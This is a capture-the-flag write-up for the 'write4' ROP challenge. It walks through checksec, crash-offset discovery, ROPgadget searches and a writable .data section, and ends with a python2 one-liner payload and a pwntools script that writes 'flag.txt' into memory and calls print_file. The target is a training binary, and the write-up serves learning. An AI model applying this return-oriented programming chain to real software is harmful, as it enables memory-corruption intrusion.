# Basic Test:

## Check call system into binary file
```bash
strace ./write4
```

## Check protection into binary file
```bash
checksec ./write4
```

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'

<br>

# Exploitation:

## Clear the kernel ring buffer
```bash
sudo dmesg -C
```

## Find offset for overwrite RIP
```bash
python2 -c 'print "A"*40 + "B"*4*' | ./write4
```

## See output
```bash
sudo dmesg -T
```

	[dim. avril  9 17:17:09 2023] write4[211697]: segfault at a42424242 ip 0000000a42424242 sp 00007ffc230ab6c0 error 14 in libc.so.6[7f0cd001f000+26000] likely on CPU 0 (core 0, socket 0)

## Find the a gadget for two parameters for moving into a section writable

```bash
ROPgadget --binary ./write4 | grep "pop r14 ; pop r15"
```
 
	0x0000000000400690 : pop r14 ; pop r15 ; ret

## Find a section writable
```bash
readelf -S ./write4
```

	  [23] .data             PROGBITS         0000000000601028  00001028
	       0000000000000010  0000000000000000  WA       0     0     8

## Find a gadget for moving the file name into .data
```bash
ROPgadget --binary ./write4 | grep "mov qword"
```

	0x0000000000400628 : mov qword ptr [r14], r15 ; ret

## Find a gadget for one parameter
```bash
ROPgadget --binary ./write4 | grep "pop rdi"
```

	0x0000000000400693 : pop rdi ; ret

## Find the address of the print_file function
```bash
pwngdb> disass*usefulFunction
```

	   0x0000000000400617 <+0>:     push   rbp
	   0x0000000000400618 <+1>:     mov    rbp,rsp
	   0x000000000040061b <+4>:     mov    edi,0x4006b4
	   0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>
	   0x0000000000400625 <+14>:    nop
	   0x0000000000400626 <+15>:    pop    rbp
	   0x0000000000400627 <+16>:    ret

## Convert Big Endian in Little Endian with python2
```python
>>> from pwn import *
>>> p64(0x0000000000400690)
'\x90\x06@\x00\x00\x00\x00\x00'
>>> p64(0x000000000601028)
'(\x10`\x00\x00\x00\x00\x00'
>>> p64(0x0000000000400628)
'(\x06@\x00\x00\x00\x00\x00'
>>> p64(0x0000000000400693)
'\x93\x06@\x00\x00\x00\x00\x00'
>>> p64(0x000000000601028)
'(\x10`\x00\x00\x00\x00\x00'
>>> p64(0x400510)
'\x10\x05@\x00\x00\x00\x00\x00'
```

## Payload final CLI

```bash
python2 -c 'print "A"*40 + "\x90\x06@\x00\x00\x00\x00\x00" + "(\x10`\x00\x00\x00\x00\x00" + "flag.txt" + "(\x06@\x00\x00\x00\x00\x00" + "\x93\x06@\x00\x00\x00\x00\x00" + "(\x10`\x00\x00\x00\x00\x00" + "\x10\x05@\x00\x00\x00\x00\x00"' | ./write4 # pop r14 ; pop r15 = 0x0000000000400690 + .data = 0x000000000601028 + file = flag.txt + mov qword PTR [r14], r15 = 0x0000000000400628 + pop rdi = 0x0000000000400693 + .data = 0x000000000601028 + call print_file = 0x400510
```

## Python2 pwntools script
```python
#usr/bin/python2
from pwn import *
elf = ELF("./write4")

padding = "A"*40
pop_r14_pop_r15 = p64(0x0000000000400690)
section_data = p64(0x000000000601028)
string = "flag.txt"
mov_qword_r14_r15 = p64(0x0000000000400628)
pop_rdi = p64(0x0000000000400693)
call_print_file = p64(0x400510)

  

payload = padding + pop_r14_pop_r15 + section_data + string + mov_qword_r14_r15
payload += pop_rdi + section_data + call_print_file

  

print(payload)
io = process(elf.path)
io.recvuntil(">")
io.sendline(payload)
print(io.recvall())

# OR

"""
io = process(elf.path)
io.sendlineafter(">", payload)
io.interactive()
"""
```